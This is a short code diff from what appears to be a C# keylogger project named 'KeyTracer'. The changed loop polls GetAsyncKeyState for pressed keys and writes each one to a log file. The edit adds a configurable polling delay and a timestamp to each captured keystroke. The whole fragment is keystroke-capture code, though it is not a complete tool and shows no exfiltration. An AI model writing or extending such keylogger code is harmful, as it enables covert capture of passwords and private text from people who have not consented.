@@ -20,11 +20,11 @@ namespace KeyTracer
                 {
                     int key = GetAsyncKeyState(x);
 
-                    Thread.Sleep(1);
+                    Thread.Sleep(Consts.matchDelayTime);
 
                     if (key == 1 || key == -32767)
                     {
-                        Writter.Write(new string[] { verifyKey(x) }, false);
+                        Writter.Write(new string[] { Time.GetTime() + "_" + verifyKey(x) }, false);
                         break;
                     }
                 }
